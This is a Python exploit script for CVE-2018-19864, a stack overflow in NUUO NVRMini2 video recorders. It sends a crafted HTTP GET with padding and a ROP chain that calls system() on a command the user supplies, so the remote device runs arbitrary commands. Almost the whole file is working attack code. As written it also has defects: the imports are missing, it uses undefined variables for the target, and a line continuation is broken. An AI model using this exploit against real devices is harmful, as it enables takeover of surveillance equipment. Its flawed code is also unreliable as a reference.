#!/usr/bin/python
# Exploit Title: NUUO NVRMini2 3.9.1 'sscanf' stack overflow
# Google Dork: n/a
# Date: Advisory Published: Nov 18
# Exploit Author: @0x00string
# Vendor Homepage: nuuo.com
# Software Link: https://www.nuuo.com/ProductNode.php?node=2
# Version: 3.9.1 and prior
# Tested on: 3.9.1
# CVE : CVE-2018-19864
#
#   [ leading / ]
#   [ Padding x 335 ]
#   [ original value at stack pointer + 158 ]
#   [ padding x 80 ]
#   [ address of (pop {r3,lr} ; bx lr) ]
#   [ system() address ]
#   [ address of (mov r0,sp ; blx r3) ]
#   [ command to execute ]

def banner():
    print '''
              @0x00string
             0000000000000
          0000000000000000000   00
       00000000000000000000000000000
      0000000000000000000000000000000
    000000000             0000000000
   00000000               0000000000
  0000000                000000000000
 0000000               000000000000000
 000000              000000000  000000
0000000            000000000     000000
000000            000000000      000000
000000          000000000        000000
000000         00000000          000000
000000       000000000           000000
0000000    000000000            0000000
 000000   000000000             000000
 0000000000000000              0000000
  0000000000000               0000000
   00000000000              00000000
   00000000000            000000000
  0000000000000000000000000000000
   00000000000000000000000000000
     000  0000000000000000000
             0000000000000
https://github.com/0x00string/oldays/blob/master/CVE-2018-19864.py
'''

def usage ():
    print   ("python script.py <args>\n"
            "   -h, --help:             Show this message\n"
            "   -a, --rhost:            Target IP address\n"
            "   -b, --rport:            Target Port - default 5150\n"
            "   -c, --command:          Command to execute\n"
            "\n"
            "Example:\n"
            "python script.py -a 10.10.10.10\n"
            "python script.py -a 10.10.10.10 -b 1234 -c reboot\n")
    exit()

def main():
    rhost = None;
    rport = "5150";
    command = "{/bin/touch,/tmp/hax}"
    banner()
    options, remainder = getopt.getopt(sys.argv[1:], 'a:b:c:fh', ['rhost=','rport=','command=','help'])
    for opt, arg in options:
        if opt in ('-h', '--help'):
            usage()
        elif opt in ('-a','--rhost'):
            rhost = arg;
        elif opt in ('-b','--rport'):
            rport = arg;
        elif opt in ('-c','--command'):
            command = arg;
    print ("Sending exploit to execute [" + command + "]\n")
    buf = "GET /" + ("Z" * 335) + "\x30\x2a\x17\x45" + ("Y" * 80) + "\x08\xfc\x78\x40" +
    "\x44\xe0\x17\x40" + "\xcc\xb7\x77\x40" + command + " HTTP/1.1\r\nHost: " +
    "http://" + rhost + ":" + rport + "\r\n\r\n"
    sock = socket(AF_INET, SOCK_STREAM)
    sock.settimeout(30)
    sock.connect((target_ip,int(target_port)))
    sock.send(buf)
    print ("done\n")

if __name__ == "__main__":
    main()